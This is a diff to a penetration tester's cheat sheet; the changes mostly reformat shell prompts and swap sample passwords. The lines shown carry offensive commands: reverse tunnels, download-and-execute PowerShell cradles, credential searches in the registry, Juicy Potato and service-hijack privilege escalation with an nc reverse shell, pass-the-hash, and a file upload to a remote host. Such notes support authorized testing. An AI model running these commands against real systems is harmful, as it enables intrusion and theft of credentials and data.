 * [www.youtube.com/watch?v=F1Tm4b57ors](https://www.youtube.com/watch?v=F1Tm4b57ors)
@@ -1616,9 +1671,9 @@ root@kali:$ md5sum chisel.exe
 
 root@kali:$ ./chisel server -p 8000 -v -reverse
 
-PS> (new-object net.webclient).downloadfile("http://127.0.0.1/chisel.exe", "$env:userprofile\music\chisel.exe")
-PS> get-filehash -alg md5 chisel.exe
-PS> Start-Process -NoNewWindows chisel.exe client 127.0.0.1:8000 R:127.0.0.1:2222:127.0.0.1:1111
+PS > (new-object net.webclient).downloadfile("http://127.0.0.1/chisel.exe", "$env:userprofile\music\chisel.exe")
+PS > get-filehash -alg md5 chisel.exe
+PS > Start-Process -NoNewWindows chisel.exe client 127.0.0.1:8000 R:127.0.0.1:2222:127.0.0.1:1111
 ```
 
 Socks5 proxy with Chisel:
@@ -1637,8 +1692,8 @@ Socks5 proxy with Chisel:
 * [github.com/kost/revsocks](https://github.com/kost/revsocks)
 
 ```
-1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass passw0rd
-2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass passw0rd
+1. root@kali:$ ./revsocks -listen :8000 -socks 127.0.0.1:1080 -pass 'Passw0rd1!'
+2. user@victim:$ ./revsocks -connect 10.14.14.3:8000 -pass 'Passw0rd1!'
 ```
 
 
@@ -1718,7 +1773,7 @@ user@vict:$ ./pspy
 Powershell history:
 
 ```
-PS> Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
+PS > Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
 ```
 
 ##### Tools
@@ -1728,7 +1783,7 @@ PS> Get-Content C:\Users\snovvcrash\AppData\Roaming\Microsoft\Windows\Powershell
 ```
 root@kali:$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite ~/tools/privilege-escalation-awesome-scripts-suite
 root@kali:$ cp ~/tools/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe . && python3 -m http.server 80
-PS> (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
+PS > (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\Users\snovvcrash\music\winPEAS.exe')
 ```
 
 `PowerUp.ps1` (PowerSploit):
@@ -1736,8 +1791,8 @@ PS> (new-object net.webclient).downloadfile('http://127.0.0.1/winPEAS.exe', 'C:\
 ```
 root@kali:$ git clone https://github.com/PowerShellMafia/PowerSploit/ -b dev ~/tools/PowerSploit
 root@kali:$ cp ~/tools/PowerSploit/Privesc/PowerUp.ps1 . && python3 -m http.server 80
-PS> powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
-PS> Invoke-AllChecks |Out-File powerup.txt
+PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
+PS > Invoke-AllChecks |Out-File powerup.txt
 ```
 
 `Sherlock.ps1`:
@@ -1745,15 +1800,15 @@ PS> Invoke-AllChecks |Out-File powerup.txt
 ```
 root@kali:$ wget https://github.com/rasta-mouse/Sherlock/raw/master/Sherlock.ps1 && python3 -m http.server 80
 powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/PowerUp.ps1')"
-PS> powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
+PS > powershell.exe -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File sherlock.txt}"
 ```
 
 `jaws-enum.ps1` (JAWS):
 
 ```
 root@kali:$ wget https://github.com/411Hall/JAWS/raw/master/jaws-enum.ps1 && python3 -m http.server 80
-PS> powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
-PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+PS > powershell.exe -exec bypass -nop -c "iex(new-object net.webclient).downloadstring('http://127.0.0.1/jaws-enum.ps1')"
+PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 ```
 
 
@@ -1762,7 +1817,7 @@ PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
 ##### runas
 
 ```
-PS> runas /netonly /user:snovvcrash powershell
+PS > runas /netonly /user:snovvcrash powershell
 ```
 
 ##### evil-winrm.rb
@@ -1778,7 +1833,7 @@ root@kali:$ ln -s ~/tools/evil-winrm/evil-winrm.rb /usr/local/bin/evil-winrm.rb
 Run:
 
 ```
-root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s `pwd` -e `pwd`
+root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd1!' -i 127.0.0.1 -s `pwd` -e `pwd`
 ```
 
 * [github.com/Hackplayers/evil-winrm](https://github.com/Hackplayers/evil-winrm)
@@ -1786,7 +1841,7 @@ root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s `pwd` -e `pwd`
 ##### psexec.py
 
 ```
-root@kali:$ psexec.py snovvcrash:qwe123@127.0.0.1
+root@kali:$ psexec.py snovvcrash:'Passw0rd1!'@127.0.0.1
 root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -1795,7 +1850,7 @@ root@kali:$ psexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0
 ##### wmiexec.py
 
 ```
-root@kali:$ wmiexec.py snovvcrash:qwe123@127.0.0.1
+root@kali:$ wmiexec.py snovvcrash:'Passw0rd1!'@127.0.0.1
 root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.0.0.1
 ```
 
@@ -1807,10 +1862,10 @@ root@kali:$ wmiexec.py -hashes :6bb872d8a9aee9fd6ed2265c8b486490 snovvcrash@127.
 Search for creds:
 
 ```
-PS> REG QUERY HKLM /f "password" /t REG_SZ /s
-PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
+PS > REG QUERY HKLM /f "password" /t REG_SZ /s
+PS > REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
 Or
-PS> Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
+PS > Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | select DefaultPassword
 ```
 
 
@@ -1885,14 +1940,14 @@ PAM MOTD:
 Run as another user:
 
 ```
-PS> $user = '<HOSTNAME>\<USERNAME>'
-PS> $pass = ConvertTo-SecureString 'passw0rd' -AsPlainText -Force
-PS> $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
+PS > $user = '<HOSTNAME>\<USERNAME>'
+PS > $pass = ConvertTo-SecureString 'Passw0rd1!' -AsPlainText -Force
+PS > $cred = New-Object System.Management.Automation.PSCredential($user, $pass)
 
-PS> Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
+PS > Invoke-Command -ComputerName <HOSTNAME> -ScriptBlock { whoami } -Credential $cred
 Or
-PS> $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
-PS> Invoke-Command -ScriptBlock { whoami } -Session $s
+PS > $s = New-PSSession -ComputerName <HOSTNAME> -Credential $cred
+PS > Invoke-Command -ScriptBlock { whoami } -Session $s
 ```
 
 
@@ -1915,10 +1970,10 @@ meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 ohpe/juicy-potato **[1]**, **[2]**:
 
 ```
-Cmd> certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
-Cmd> certutil -urlcache -split -f http://127.0.0.1/rev.bat C:\Windows\System32\spool\drivers\color\rev.bat
+Cmd > certutil -urlcache -split -f http://127.0.0.1/[3] C:\Windows\System32\spool\drivers\color\j.exe
+Cmd > certutil -urlcache -split -f http://127.0.0.1/rev.bat C:\Windows\System32\spool\drivers\color\rev.bat
 root@kali:$ nc -lvnp 443
-Cmd> j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
+Cmd > j.exe -l 443 -p C:\Windows\System32\spool\drivers\color\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
 ```
 
 ```bat
@@ -1936,13 +1991,13 @@ cmd /c powershell -NoP IEX (New-Object Net.WebClient).DownloadString('http://127
 #### wuauserv
 
 ```
-PS> Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\* | format-list * | findstr /i "snovvcrash Users Path ChildName"
-PS> Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
-PS> reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.16 1337 -e powershell" /f
-PS> Start-Service wuauserv
+PS > Get-Acl HKLM:\SYSTEM\CurrentControlSet\services\* | format-list * | findstr /i "snovvcrash Users Path ChildName"
+PS > Get-ItemProperty HKLM:\System\CurrentControlSet\services\wuauserv
+PS > reg add "HKLM\System\CurrentControlSet\services\wuauserv" /t REG_EXPAND_SZ /v ImagePath /d "C:\Windows\System32\spool\drivers\color\nc.exe 10.10.14.16 1337 -e powershell" /f
+PS > Start-Service wuauserv
 ...get reverse shell...
-PS> Get-Service wuauserv
-PS> Stop-Service wuauserv
+PS > Get-Service wuauserv
+PS > Stop-Service wuauserv
 ```
 
 
@@ -2535,42 +2590,42 @@ root@kali:$ kerbrute userenum -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclist
 root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -request
 root@kali:$ crackmapexec smb 127.0.0.1 -u snovvcrash -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt
 root@kali:$ kerbrute bruteuser -d EXAMPLE.LOCAL --dc 127.0.0.1 /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt snovvcrash -t 50
-root@kali:$ evil-winrm.rb -u snovvcrash -p qwe123 -i 127.0.0.1 -s `pwd` -e `pwd`
+root@kali:$ evil-winrm.rb -u snovvcrash -p 'Passw0rd1!' -i 127.0.0.1 -s `pwd` -e `pwd`
 
-PS> systeminfo
-PS> whoami /priv (whoami /all)
-PS> gci "$env:userprofile" -recurse -force -af |select fullname
-PS> net user
-PS> net user /domain
-PS> net user j.doe /domain
-PS> net accounts
-PS> net accounts /domain
-PS> net localgroup Administrators
-PS> net group /domain
-PS> net group "Domain admins" /domain
-PS> net group "Enterprise admins" /domain
-PS> cmdkey /list
-PS> wmic product get name
-PS> get-process
-PS> tasklist /SVC
-PS> net start
-PS> netstat -ano | findstr LIST
-PS> ipconfig /all
-PS> route print
-PS> dir -force c:\
-PS> [Environment]::Is64BitOperatingSystem
-PS> $ExecutionContext.SessionState.LanguageMode
+PS > systeminfo
+PS > whoami /priv (whoami /all)
+PS > gci "$env:userprofile" -recurse -force -af |select fullname
+PS > net user
+PS > net user /domain
+PS > net user j.doe /domain
+PS > net accounts
+PS > net accounts /domain
+PS > net localgroup Administrators
+PS > net group /domain
+PS > net group "Domain admins" /domain
+PS > net group "Enterprise admins" /domain
+PS > cmdkey /list
+PS > wmic product get name
+PS > get-process
+PS > tasklist /SVC
+PS > net start
+PS > netstat -ano | findstr LIST
+PS > ipconfig /all
+PS > route print
+PS > dir -force c:\
+PS > [Environment]::Is64BitOperatingSystem
+PS > $ExecutionContext.SessionState.LanguageMode
 
-PS> cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
-PS> cmd /c where /R C:\ *.ini
-PS> REG QUERY HKLM /f "password" /t REG_SZ /s
-PS> REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
-PS> reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
+PS > cmd /c dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
+PS > cmd /c where /R C:\ *.ini
+PS > REG QUERY HKLM /f "password" /t REG_SZ /s
+PS > REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | findstr /i "DefaultUserName DefaultDomainName DefaultPassword AltDefaultUserName AltDefaultDomainName AltDefaultPassword LastUsedUsername"
+PS > reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings" | findstr /i proxy
 
-PS> .\winPEAS.bat
-PS> .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
-PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
-PS> powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
+PS > .\winPEAS.bat
+PS > .\jaws-enum.ps1 -OutputFileName jaws-enum.txt
+PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks |Out-File PowerUp.txt}"
+PS > powershell.exe -nop -exec bypass -c "& {Import-Module .\Sherlock.ps1; Find-AllVulns |Out-File Sherlock.txt}"
 ```
 
 
@@ -2591,7 +2646,7 @@ $proxyAddr=(Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\In
 Powershell manually set proxy and upload file to remote HTTP server:
 
 ```
-$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.example.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','qwe123','example.local');$creds=$creds.GetCredential("http://proxy.example.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
+$client=New-Object System.Net.WebClient;$proxy=New-Object System.Net.WebProxy("http://proxy.example.local:3128",$true);$creds=New-Object Net.NetworkCredential('snovvcrash','Passw0rd1!','example.local');$creds=$creds.GetCredential("http://proxy.example.local","3128","KERBEROS");$proxy.Credentials=$creds;$client.Proxy=$proxy;$client.UploadFile("http://10.10.13.37/results.txt","results.txt")
 ```
 
 
@@ -2945,7 +3000,7 @@ $ gpg -o/--output decrypted.txt -d/--decrypt -u/--local-user user1@example.com -
 ## DHCP
 
 ```
-Cmd> "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
+Cmd > "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" dhcpserver add --netname intnet --ip 10.0.1.1 --netmask 255.255.255.0 --lowerip 10.0.1.101 --upperip 10.0.1.254 --enable
 ```
 
 
@@ -3624,7 +3679,7 @@ $ sudo mv screenfetch /usr/bin
 ### cipher
 
 ```
-Cmd> cipher /w:H
+Cmd > cipher /w:H
 ```
 
 
@@ -3634,19 +3689,19 @@ Cmd> cipher /w:H
 File:
 
 ```
-Cmd> sdelete -p 7 testfile.txt
+Cmd > sdelete -p 7 testfile.txt
 ```
 
 Directory (recursively):
 
 ```
-Cmd> sdelete -p 7 -r "C:\temp"
+Cmd > sdelete -p 7 -r "C:\temp"
 ```
 
 Disk or partition:
 
 ```
-Cmd> sdelete -p 7 -c H:
+Cmd > sdelete -p 7 -c H:
 ```
 
 
@@ -3655,7 +3710,7 @@ Cmd> sdelete -p 7 -c H:
 ## System Perfomance
 
 ```
-Cmd> perfmon /res
+Cmd > perfmon /res
 ```
 
 
@@ -3668,9 +3723,9 @@ Cmd> perfmon /res
 ### Connections and Routes
 
 ```
-Cmd> netstat -b
-Cmd> netstat -ano
-Cmd> route print [-4]
+Cmd > netstat -b
+Cmd > netstat -ano
+Cmd > route print [-4]
 ```
 
 
@@ -3678,20 +3733,20 @@ Cmd> route print [-4]
 ### Clean Cache
 
 ```
-Cmd> netsh int ip reset
-Cmd> netsh int tcp reset
-Cmd> ipconfig /flushdns
-Cmd> netsh winsock reset
-Cmd> route -f
+Cmd > netsh int ip reset
+Cmd > netsh int tcp reset
+Cmd > ipconfig /flushdns
+Cmd > netsh winsock reset
+Cmd > route -f
 [Cmd> ipconfig -renew]
 ```
 
 Hide/unhide computer name on LAN:
 
 ```
-Cmd> net config server
-Cmd> net config server /hidden:yes
-Cmd> net config server /hidden:no
+Cmd > net config server
+Cmd > net config server /hidden:yes
+Cmd > net config server /hidden:no
 (+ reboot)
 ```
 
@@ -3701,8 +3756,8 @@ Cmd> net config server /hidden:no
 ## Symlinks
 
 ```
-Cmd> mklink Link <FILE>
-Cmd> mklink /D Link <DIRECTORY>
+Cmd > mklink Link <FILE>
+Cmd > mklink /D Link <DIRECTORY>
 ```
 
 
@@ -3711,7 +3766,7 @@ Cmd> mklink /D Link <DIRECTORY>
 ## Installed Software
 
 ```
-PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize > InstalledSoftware.txt
+PS > Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize > InstalledSoftware.txt
 ```
 
 
@@ -3720,10 +3775,10 @@ PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion
 ## ADS
 
 ```
-PS> Get-Item 'file.txt' -Stream *
-PS> Get-Content 'file.txt' -Stream Password
+PS > Get-Item 'file.txt' -Stream *
+PS > Get-Content 'file.txt' -Stream Password
 Or
-PS> type 'file.txt:Password'
+PS > type 'file.txt:Password'
 ```
 
 
@@ -3741,7 +3796,7 @@ certmgr.msc -- "Certificates - Current User" -- "Сертификаты - тек
 
 
 
-## Store Credentials
+## KRShowKeyMgr
 
 Run:
 
@@ -3757,9 +3812,9 @@ rundll32.exe keymgr.dll, KRShowKeyMgr
 Take own of a directory and remove it (run cmd.exe as admin):
 
 ```
-Cmd> takeown /F C:\$Windows.~BT\* /R /A 
-Cmd> icacls C:\$Windows.~BT\*.* /T /grant administrators:F 
-Cmd> rmdir /S /Q C:\$Windows.~BT\
+Cmd > takeown /F C:\$Windows.~BT\* /R /A 
+Cmd > icacls C:\$Windows.~BT\*.* /T /grant administrators:F 
+Cmd > rmdir /S /Q C:\$Windows.~BT\
 ```
 
 
